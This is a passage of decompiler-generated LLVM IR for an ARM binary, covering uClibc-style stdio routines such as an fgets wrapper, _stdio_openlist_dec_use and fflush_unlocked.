  store i32 %v3_1abe0, i32* %stack_var_-28, align 4
  %v6_1abe0 = load i32, i32* @r5, align 4
  %v9_1abe0 = load i32, i32* @r6, align 4
  %v12_1abe0 = load i32, i32* @r7, align 4
  %v21_1abe0 = load i32, i32* @lr, align 4
  %v1_1abe4 = add i32 %arg3, 52
  %v2_1abe4 = inttoptr i32 %v1_1abe4 to i32*
  %v3_1abe4 = load i32, i32* %v2_1abe4, align 4
  %v1_1abec = sub i32 1, %v3_1abe4
  %v2_1abec = icmp ult i32 %v3_1abe4, 2
  br i1 %v2_1abec, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_1abec, %entry ]
  %v0_1abf4 = phi i32 [ 0, %bb ], [ %v1_1abec, %entry ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_1abf4 = icmp eq i32 %v0_1abf4, 0
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_1abf4, label %dec_label_pc_1ac48, label %dec_label_pc_1ac10

dec_label_pc_1ac10:                               ; preds = %bb16
  %v1_1ac14 = add i32 %arg3, 56
  store i32 %v1_1ac14, i32* @r4, align 4
  %v4_1ac28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1ac28)
  %v0_1ac3c = load i32, i32* @r5, align 4
  %v2_1ac3c = add i32 %v0_1ac3c, 20
  %v3_1ac3c = inttoptr i32 %v2_1ac3c to i32*
  %v4_1ac3c = load i32, i32* %v3_1ac3c, align 4
  store i32 %v4_1ac3c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1ac48.1601 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1ac3c)
  %v0_1ac48.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1ac4c.pre = load i32, i32* @r7, align 4
  %v0_1ac50.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1ac48

dec_label_pc_1ac48:                               ; preds = %bb16, %dec_label_pc_1ac10
  %v0_1ac50 = phi i32 [ %arg3, %bb16 ], [ %v0_1ac50.pre, %dec_label_pc_1ac10 ]
  %v0_1ac4c = phi i32 [ %arg2, %bb16 ], [ %v0_1ac4c.pre, %dec_label_pc_1ac10 ]
  %v0_1ac48 = phi i32 [ %arg1, %bb16 ], [ %v0_1ac48.pre, %dec_label_pc_1ac10 ]
  %v3_1ac54 = inttoptr i32 %v0_1ac48 to i8*
  %v4_1ac54 = call i32 @__GI_fgets_unlocked(i8* %v3_1ac54, i32 %v0_1ac4c, i32 %v0_1ac50)
  %v0_1ac58 = load i32, i32* %sl.global-to-local, align 4
  %v2_1ac58 = icmp eq i32 %v0_1ac58, 0
  store i32 %v4_1ac54, i32* %r4.global-to-local, align 4
  br i1 %v2_1ac58, label %dec_label_pc_1ac48..thread3_crit_edge, label %bb17

dec_label_pc_1ac48..thread3_crit_edge:            ; preds = %dec_label_pc_1ac48
  %v0_1ac74.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_1ac48
  %v1_1ac6c = load i32, i32* @r5, align 4
  %v3_1ac6c = add i32 %v1_1ac6c, 28
  %v4_1ac6c = inttoptr i32 %v3_1ac6c to i32*
  %v5_1ac6c = load i32, i32* %v4_1ac6c, align 4
  store i32 %v5_1ac6c, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1ac48..thread3_crit_edge, %bb17
  %v0_1ac74 = phi i32 [ %v0_1ac74.pre, %dec_label_pc_1ac48..thread3_crit_edge ], [ %v5_1ac6c, %bb17 ]
  %v2_1ac74 = xor i1 %v2_1ac58, true
  call void @__pseudo_cond_branch(i1 %v2_1ac74, i32 %v0_1ac74)
  %v0_1ac78 = load i32, i32* %r4.global-to-local, align 4
  %v2_1ac80 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1ac80, i32* @r4, align 4
  store i32 %v6_1abe0, i32* @r5, align 4
  store i32 %v9_1abe0, i32* @r6, align 4
  store i32 %v12_1abe0, i32* @r7, align 4
  store i32 %v21_1abe0, i32* @lr, align 4
  ret i32 %v0_1ac78

; uselistorder directives
  uselistorder i32 %v3_1abe4, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1ac48, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_1ac8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ac8c:
  %v0_1ac8c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ac8c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1ac8c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1ac8c, %bb
  %v10_1ac98 = phi i32 [ %arg1, %dec_label_pc_1ac8c ], [ 0, %bb ]
  ret i32 %v10_1ac98

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1ac9c = load i32, i32* @r4, align 4
  store i32 %v3_1ac9c, i32* %stack_var_-24, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r6.global-to-local, align 4
  %v4_1acac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 40) to i32*), align 4
  store i32 %v4_1acac, i32* %r8.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_1acb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 120) to i32*), align 4
  store i32 %v4_1acb4, i32* %r4.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_1acc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  store i32 %v4_1acc0, i32* %r7.global-to-local, align 4
  %v2_1accc = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_1acc0)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_1ace0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ace0 = add i32 %v0_1ace0, 20
  %v3_1ace0 = inttoptr i32 %v2_1ace0 to i32*
  %v4_1ace0 = load i32, i32* %v3_1ace0, align 4
  store i32 %v4_1ace0, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1ace0)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_1acf0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1acf0 = add i32 %v0_1acf0, 12
  %v3_1acf0 = inttoptr i32 %v2_1acf0 to i32*
  %v4_1acf0 = load i32, i32* %v3_1acf0, align 4
  store i32 %v4_1acf0, i32* %r3.global-to-local, align 4
  %v1_1acf4 = inttoptr i32 %v4_1acf0 to i32*
  %v2_1acf4 = load i32, i32* %v1_1acf4, align 4
  store i32 %v2_1acf4, i32* %r3.global-to-local, align 4
  %v7_1acf8 = icmp eq i32 %v2_1acf4, 1
  br i1 %v7_1acf8, label %dec_label_pc_1ad00, label %dec_label_pc_1adc0

dec_label_pc_1ad00:                               ; preds = %entry
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_1ad04 = add i32 %v0_1acf0, 56
  %v3_1ad04 = inttoptr i32 %v2_1ad04 to i32*
  %v4_1ad04 = load i32, i32* %v3_1ad04, align 4
  store i32 %v4_1ad04, i32* %r3.global-to-local, align 4
  %v1_1ad08 = inttoptr i32 %v4_1ad04 to i32*
  %v2_1ad08 = load i32, i32* %v1_1ad08, align 4
  store i32 %v2_1ad08, i32* %r3.global-to-local, align 4
  %tmp32 = icmp slt i32 %v2_1ad08, 1
  br i1 %tmp32, label %dec_label_pc_1adc0, label %dec_label_pc_1ad14

dec_label_pc_1ad14:                               ; preds = %dec_label_pc_1ad00
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_1ad18 = add i32 %v0_1acf0, 108
  %v3_1ad18 = inttoptr i32 %v2_1ad18 to i32*
  %v4_1ad18 = load i32, i32* %v3_1ad18, align 4
  store i32 %v4_1ad18, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1acc0)
  call void @__pseudo_branch(i32 %v4_1ace0)
  %v0_1ad40 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ad40 = add i32 %v0_1ad40, 52
  %v3_1ad40 = inttoptr i32 %v2_1ad40 to i32*
  %v4_1ad40 = load i32, i32* %v3_1ad40, align 4
  store i32 %v4_1ad40, i32* %r3.global-to-local, align 4
  %v1_1ad44 = inttoptr i32 %v4_1ad40 to i32*
  %v2_1ad44 = load i32, i32* %v1_1ad44, align 4
  store i32 %v2_1ad44, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1ad9013 = icmp eq i32 %v2_1ad44, 0
  br i1 %v2_1ad9013, label %dec_label_pc_1ad9c, label %dec_label_pc_1ad54

dec_label_pc_1ad54:                               ; preds = %dec_label_pc_1ad14, %dec_label_pc_1ad8c
  %v0_1ad784 = phi i32 [ %v0_1ad8c, %dec_label_pc_1ad8c ], [ %v2_1ad44, %dec_label_pc_1ad14 ]
  %v1_1ad54 = inttoptr i32 %v0_1ad784 to i16*
  %v2_1ad54 = load i16, i16* %v1_1ad54, align 2
  %v3_1ad54 = zext i16 %v2_1ad54 to i32
  store i32 %v3_1ad54, i32* %r3.global-to-local, align 4
  %v2_1ad58 = and i32 %v3_1ad54, 32816
  %v7_1ad5c = icmp eq i32 %v2_1ad58, 48
  %v1_1ad60 = add i32 %v0_1ad784, 32
  %v2_1ad60 = inttoptr i32 %v1_1ad60 to i32*
  %v3_1ad60 = load i32, i32* %v2_1ad60, align 4
  store i32 %v3_1ad60, i32* %r5.global-to-local, align 4
  br i1 %v7_1ad5c, label %dec_label_pc_1ad6c, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_1ad54
  store i32 %v0_1ad784, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1ad8c

dec_label_pc_1ad6c:                               ; preds = %dec_label_pc_1ad54
  %v0_1ad6c = load i32, i32* %r7.global-to-local, align 4
  %v2_1ad6c = icmp eq i32 %v0_1ad6c, 0
  br i1 %v2_1ad6c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1ad6c
  %v1_1ad70 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ad70 = load i32, i32* %r8.global-to-local, align 4
  %v3_1ad70 = add i32 %v2_1ad70, %v1_1ad70
  %v4_1ad70 = inttoptr i32 %v3_1ad70 to i32*
  %v5_1ad70 = load i32, i32* %v4_1ad70, align 4
  store i32 %v5_1ad70, i32* %r3.global-to-local, align 4
  %v3_1ad74 = inttoptr i32 %v5_1ad70 to i32*
  store i32 %v3_1ad60, i32* %v3_1ad74, align 4
  %v0_1ad78 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ad78 = inttoptr i32 %v0_1ad78 to i16*
  %v2_1ad78 = load i16, i16* %v1_1ad78, align 2
  %v3_1ad78 = zext i16 %v2_1ad78 to i32
  store i32 %v3_1ad78, i32* %r3.global-to-local, align 4
  br label %bb33

bb:                                               ; preds = %dec_label_pc_1ad6c
  %v2_1ad7810 = load i16, i16* %v1_1ad54, align 2
  %v3_1ad7811 = zext i16 %v2_1ad7810 to i32
  store i32 %v3_1ad7811, i32* %r3.global-to-local, align 4
  %v3_1ad7c = add i32 %v0_1ad6c, 32
  %v4_1ad7c = inttoptr i32 %v3_1ad7c to i32*
  store i32 %v3_1ad60, i32* %v4_1ad7c, align 4
  %v0_1ad80.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %.thread, %bb
  %v0_1ad80 = phi i32 [ %v3_1ad78, %.thread ], [ %v0_1ad80.pre, %bb ]
  %v1_1ad80 = and i32 %v0_1ad80, 8192
  %v2_1ad80 = icmp eq i32 %v1_1ad80, 0
  br i1 %v2_1ad80, label %bb35, label %bb34

bb34:                                             ; preds = %bb33
  br label %bb35

bb35:                                             ; preds = %bb33, %bb34
  %v1_1ad88 = xor i1 %v2_1ad80, true
  call void @__pseudo_cond_branch(i1 %v1_1ad88, i32 ptrtoint (i32* @global_var_17278.1556 to i32))
  %v0_1ad8c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1ad8c

dec_label_pc_1ad8c:                               ; preds = %.thread23, %bb35
  %v0_1ad8c = phi i32 [ %v0_1ad8c.pre, %bb35 ], [ %v3_1ad60, %.thread23 ]
  store i32 %v0_1ad8c, i32* %r4.global-to-local, align 4
  %v2_1ad90 = icmp eq i32 %v0_1ad8c, 0
  br i1 %v2_1ad90, label %dec_label_pc_1ad90.dec_label_pc_1ad9c_crit_edge, label %dec_label_pc_1ad54

dec_label_pc_1ad90.dec_label_pc_1ad9c_crit_edge:  ; preds = %dec_label_pc_1ad8c
  %v0_1ada8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1ad9c

dec_label_pc_1ad9c:                               ; preds = %dec_label_pc_1ad90.dec_label_pc_1ad9c_crit_edge, %dec_label_pc_1ad14
  %v0_1ada8 = phi i32 [ %v0_1ada8.pre, %dec_label_pc_1ad90.dec_label_pc_1ad9c_crit_edge ], [ %v0_1ad40, %dec_label_pc_1ad14 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_1ada8 = add i32 %v0_1ada8, 28
  %v3_1ada8 = inttoptr i32 %v2_1ada8 to i32*
  %v4_1ada8 = load i32, i32* %v3_1ada8, align 4
  call void @__pseudo_branch(i32 %v4_1ada8)
  store i32 56, i32* %r3.global-to-local, align 4
  %v0_1adb8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1adb8 = add i32 %v0_1adb8, 56
  %v3_1adb8 = inttoptr i32 %v2_1adb8 to i32*
  %v4_1adb8 = load i32, i32* %v3_1adb8, align 4
  store i32 %v4_1adb8, i32* %r3.global-to-local, align 4
  %v0_1adbc = load i32, i32* %r4.global-to-local, align 4
  %v2_1adbc = inttoptr i32 %v4_1adb8 to i32*
  store i32 %v0_1adbc, i32* %v2_1adbc, align 4
  %v0_1adc4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1adc0

dec_label_pc_1adc0:                               ; preds = %entry, %dec_label_pc_1ad00, %dec_label_pc_1ad9c
  %v0_1adc4 = phi i32 [ %v0_1acf0, %entry ], [ %v0_1acf0, %dec_label_pc_1ad00 ], [ %v0_1adc4.pre, %dec_label_pc_1ad9c ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1adc4 = add i32 %v0_1adc4, 12
  %v3_1adc4 = inttoptr i32 %v2_1adc4 to i32*
  %v4_1adc4 = load i32, i32* %v3_1adc4, align 4
  %v1_1adc8 = inttoptr i32 %v4_1adc4 to i32*
  %v2_1adc8 = load i32, i32* %v1_1adc8, align 4
  %v1_1adcc = add i32 %v2_1adc8, -1
  store i32 %v1_1adcc, i32* %v1_1adc8, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_1ade0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1ade0 = add i32 %v0_1ade0, 28
  %v3_1ade0 = inttoptr i32 %v2_1ade0 to i32*
  %v4_1ade0 = load i32, i32* %v3_1ade0, align 4
  store i32 %v4_1ade0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1ade0)
  %v2_1adf0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1adf0, i32* %r4.global-to-local, align 4
  ret i32 %v2_1accc

; uselistorder directives
  uselistorder i32 %v0_1ad8c, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 7, 3, 4, 5, 6, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_1adc0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ad8c, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_1ad54, { 1, 0 }
}

define i32 @function_1adfc(i32 %arg1) local_unnamed_addr {
dec_label_pc_1adfc:
  %v0_1adfc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1adfc, label %bb, label %.thread8

bb:                                               ; preds = %dec_label_pc_1adfc
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1adfc, %bb
  %v10_1ae20 = phi i32 [ %arg1, %dec_label_pc_1adfc ], [ 0, %bb ]
  ret i32 %v10_1ae20

; uselistorder directives
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %sb.global-to-local, align 4
  %v4_1ae34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 52) to i32*), align 4
  store i32 %v4_1ae34, i32* %r3.global-to-local, align 4
  %v10_1ae38 = icmp eq i32 %tmp, %v4_1ae34
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v10_1ae38, label %bb, label %dec_label_pc_1ae50

bb:                                               ; preds = %entry
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1ae60

dec_label_pc_1ae50:                               ; preds = %entry
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_1ae54 = icmp eq i16* %arg1, null
  br i1 %v2_1ae54, label %dec_label_pc_1ae60, label %dec_label_pc_1afc8

dec_label_pc_1ae60:                               ; preds = %bb, %dec_label_pc_1ae50
  %stack_var_-60.1.in = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_1ae50 ]
  store i32 120, i32* %r3.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_1ae74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 120) to i32*), align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_1ae80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  store i32 20, i32* %stack_var_-72, align 4
  store i32 %v4_1ae74, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1ae80)
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_1aea4 = load i32, i32* %sb.global-to-local, align 4
  %v2_1aea4 = add i32 %v0_1aea4, 20
  %v3_1aea4 = inttoptr i32 %v2_1aea4 to i32*
  %v4_1aea4 = load i32, i32* %v3_1aea4, align 4
  call void @__pseudo_branch(i32 %v4_1aea4)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1aeb4 = add i32 %v0_1aea4, 12
  %v3_1aeb4 = inttoptr i32 %v2_1aeb4 to i32*
  %v4_1aeb4 = load i32, i32* %v3_1aeb4, align 4
  store i32 %v4_1aeb4, i32* %r2.global-to-local, align 4
  %v1_1aeb8 = inttoptr i32 %v4_1aeb4 to i32*
  %v2_1aeb8 = load i32, i32* %v1_1aeb8, align 4
  store i32 28, i32* %sl.global-to-local, align 4
  %v1_1aec0 = add i32 %v2_1aeb8, 1
  store i32 %v1_1aec0, i32* %r3.global-to-local, align 4
  %v2_1aec4 = add i32 %v0_1aea4, 28
  %v3_1aec4 = inttoptr i32 %v2_1aec4 to i32*
  %v4_1aec4 = load i32, i32* %v3_1aec4, align 4
  store i32 %v1_1aec0, i32* %v1_1aeb8, align 4
  call void @__pseudo_branch(i32 %v4_1aec4)
  store i32 108, i32* %r3.global-to-local, align 4
  %v0_1aee0 = load i32, i32* %sb.global-to-local, align 4
  %v2_1aee0 = add i32 %v0_1aee0, 108
  %v3_1aee0 = inttoptr i32 %v2_1aee0 to i32*
  %v4_1aee0 = load i32, i32* %v3_1aee0, align 4
  store i32 %v4_1aee0, i32* @r4, align 4
  store i32 %v4_1aee0, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1ae80)
  call void @__pseudo_branch(i32 %v4_1aea4)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_1af08 = load i32, i32* %sb.global-to-local, align 4
  %v2_1af08 = add i32 %v0_1af08, 52
  %v3_1af08 = inttoptr i32 %v2_1af08 to i32*
  %v4_1af08 = load i32, i32* %v3_1af08, align 4
  store i32 %v4_1af08, i32* %r3.global-to-local, align 4
  %v1_1af14 = inttoptr i32 %v4_1af08 to i32*
  %v2_1af14 = load i32, i32* %v1_1af14, align 4
  store i32 %v2_1af14, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_1aec4)
  %v0_1af20 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1af20, i32* @r6, align 4
  %v2_1af24 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1af24, i32* @r8, align 4
  store i32 80, i32* %fp.global-to-local, align 4
  %v0_1afb8.pr = load i32, i32* @r7, align 4
  %v2_1afb820 = icmp eq i32 %v0_1afb8.pr, 0
  br i1 %v2_1afb820, label %dec_label_pc_1afc0, label %dec_label_pc_1af2c

dec_label_pc_1af2c:                               ; preds = %dec_label_pc_1ae60, %dec_label_pc_1afb4
  %v0_1af38 = phi i32 [ %v3_1afb4, %dec_label_pc_1afb4 ], [ %v0_1afb8.pr, %dec_label_pc_1ae60 ]
  %v1_1af2c = inttoptr i32 %v0_1af38 to i16*
  %v2_1af2c = load i16, i16* %v1_1af2c, align 2
  %v3_1af2c = zext i16 %v2_1af2c to i32
  store i32 %v3_1af2c, i32* %r3.global-to-local, align 4
  %v1_1af30 = and i32 %v3_1af2c, 64
  %v2_1af30 = icmp eq i32 %v1_1af30, 0
  br i1 %v2_1af30, label %dec_label_pc_1afb4, label %dec_label_pc_1af38

dec_label_pc_1af38:                               ; preds = %dec_label_pc_1af2c
  %v1_1af38 = add i32 %v0_1af38, 56
  store i32 %v1_1af38, i32* @r4, align 4
  store i32 %v1_1af38, i32* %r2.global-to-local, align 4
  %v0_1af48 = load i32, i32* %sb.global-to-local, align 4
  %v1_1af48 = load i32, i32* %fp.global-to-local, align 4
  %v2_1af48 = add i32 %v1_1af48, %v0_1af48
  %v3_1af48 = inttoptr i32 %v2_1af48 to i32*
  %v4_1af48 = load i32, i32* %v3_1af48, align 4
  call void @__pseudo_branch(i32 %v4_1af48)
  %v1_1af58 = load i32, i32* @r8, align 4
  %v2_1af58 = add i32 %v1_1af58, %v0_1af48
  %v3_1af58 = inttoptr i32 %v2_1af58 to i32*
  %v4_1af58 = load i32, i32* %v3_1af58, align 4
  call void @__pseudo_branch(i32 %v4_1af58)
  %v0_1af64 = load i32, i32* @r7, align 4
  %v1_1af64 = inttoptr i32 %v0_1af64 to i16*
  %v2_1af64 = load i16, i16* %v1_1af64, align 2
  %v3_1af64 = zext i16 %v2_1af64 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_1af6c = or i32 %v3_1af64, %stack_var_-60.1.in
  %v1_1af70 = xor i32 %v2_1af6c, 320
  store i32 %v1_1af70, i32* %r3.global-to-local, align 4
  %v1_1af74 = and i32 %v1_1af70, 832
  %v2_1af74 = icmp eq i32 %v1_1af74, 0
  br i1 %v2_1af74, label %dec_label_pc_1af7c, label %bb39

dec_label_pc_1af7c:                               ; preds = %dec_label_pc_1af38
  store i32 %v0_1af64, i32* @r0, align 4
  %v0_1af80 = call i32 @__stdio_wcommit()
  %v2_1af84 = icmp eq i32 %v0_1af80, 0
  br i1 %v2_1af84, label %.thread8, label %.thread9

.thread8:                                         ; preds = %dec_label_pc_1af7c
  %v1_1af88 = load i32, i32* @r7, align 4
  %v2_1af88 = inttoptr i32 %v1_1af88 to i16*
  %v3_1af88 = load i16, i16* %v2_1af88, align 2
  %v4_1af88 = zext i16 %v3_1af88 to i32
  store i32 %v4_1af88, i32* %r3.global-to-local, align 4
  %v2_1af8c = add i32 %v1_1af88, 8
  %v3_1af8c = inttoptr i32 %v2_1af8c to i32*
  %v4_1af8c = load i32, i32* %v3_1af8c, align 4
  store i32 %v4_1af8c, i32* %r2.global-to-local, align 4
  %v2_1af90 = and i32 %v4_1af88, 65471
  store i32 %v2_1af90, i32* %r3.global-to-local, align 4
  %v3_1af94 = add i32 %v1_1af88, 28
  %v4_1af94 = inttoptr i32 %v3_1af94 to i32*
  store i32 %v4_1af8c, i32* %v4_1af94, align 4
  %v1_1af98 = load i32, i32* %r3.global-to-local, align 4
  %v2_1af98 = trunc i32 %v1_1af98 to i16
  %v3_1af98 = load i32, i32* @r7, align 4
  %v4_1af98 = inttoptr i32 %v3_1af98 to i16*
  store i16 %v2_1af98, i16* %v4_1af98, align 2
  br label %bb39

.thread9:                                         ; preds = %dec_label_pc_1af7c
  store i32 -1, i32* @r6, align 4
  br label %bb39

bb39:                                             ; preds = %.thread8, %dec_label_pc_1af38, %.thread9
  %v0_1afa8 = load i32, i32* %sb.global-to-local, align 4
  %v1_1afa8 = load i32, i32* %sl.global-to-local, align 4
  %v2_1afa8 = add i32 %v1_1afa8, %v0_1afa8
  %v3_1afa8 = inttoptr i32 %v2_1afa8 to i32*
  %v4_1afa8 = load i32, i32* %v3_1afa8, align 4
  call void @__pseudo_branch(i32 %v4_1afa8)
  %v0_1afb4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1afb4

dec_label_pc_1afb4:                               ; preds = %dec_label_pc_1af2c, %bb39
  %v0_1afb4 = phi i32 [ %v0_1af38, %dec_label_pc_1af2c ], [ %v0_1afb4.pre, %bb39 ]
  %v1_1afb4 = add i32 %v0_1afb4, 32
  %v2_1afb4 = inttoptr i32 %v1_1afb4 to i32*
  %v3_1afb4 = load i32, i32* %v2_1afb4, align 4
  store i32 %v3_1afb4, i32* @r7, align 4
  %v2_1afb8 = icmp eq i32 %v3_1afb4, 0
  br i1 %v2_1afb8, label %dec_label_pc_1afc0, label %dec_label_pc_1af2c

dec_label_pc_1afc0:                               ; preds = %dec_label_pc_1afb4, %dec_label_pc_1ae60
  %v0_1afc0 = call i32 @_stdio_openlist_dec_use()
  %v0_1affc.pre = load i32, i32* @r6, align 4
  br label %bb41

dec_label_pc_1afc8:                               ; preds = %dec_label_pc_1ae50
  %v2_1afc8 = load i16, i16* %arg1, align 2
  %v3_1afc8 = zext i16 %v2_1afc8 to i32
  %v1_1afcc = and i32 %v3_1afc8, 64
  store i32 %v1_1afcc, i32* %r3.global-to-local, align 4
  %v2_1afcc = icmp eq i32 %v1_1afcc, 0
  br i1 %v2_1afcc, label %bb40, label %dec_label_pc_1afd8

bb40:                                             ; preds = %dec_label_pc_1afc8
  br label %bb41

dec_label_pc_1afd8:                               ; preds = %dec_label_pc_1afc8
  %v0_1afd8 = call i32 @__stdio_wcommit()
  %v2_1afdc = icmp eq i32 %v0_1afd8, 0
  br i1 %v2_1afdc, label %.thread16, label %.thread18

.thread18:                                        ; preds = %dec_label_pc_1afd8
  br label %bb41

.thread16:                                        ; preds = %dec_label_pc_1afd8
  %v1_1afe0 = load i32, i32* %fp.global-to-local, align 4
  %v2_1afe0 = inttoptr i32 %v1_1afe0 to i16*
  %v3_1afe0 = load i16, i16* %v2_1afe0, align 2
  %v4_1afe0 = zext i16 %v3_1afe0 to i32
  store i32 %v4_1afe0, i32* %r3.global-to-local, align 4
  %v2_1afe4 = add i32 %v1_1afe0, 8
  %v3_1afe4 = inttoptr i32 %v2_1afe4 to i32*
  %v4_1afe4 = load i32, i32* %v3_1afe4, align 4
  store i32 %v4_1afe4, i32* %r2.global-to-local, align 4
  %v2_1afe8 = and i32 %v4_1afe0, 65471
  store i32 %v2_1afe8, i32* %r3.global-to-local, align 4
  %v2_1afec = trunc i32 %v2_1afe8 to i16
  store i16 %v2_1afec, i16* %v2_1afe0, align 2
  %v1_1aff0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1aff0 = load i32, i32* %fp.global-to-local, align 4
  %v3_1aff0 = add i32 %v2_1aff0, 28
  %v4_1aff0 = inttoptr i32 %v3_1aff0 to i32*
  store i32 %v1_1aff0, i32* %v4_1aff0, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread18, %dec_label_pc_1afc0, %.thread16
  %v0_1affc = phi i32 [ -1, %.thread18 ], [ 0, %bb40 ], [ %v0_1affc.pre, %dec_label_pc_1afc0 ], [ 0, %.thread16 ]
  ret i32 %v0_1affc

; uselistorder directives
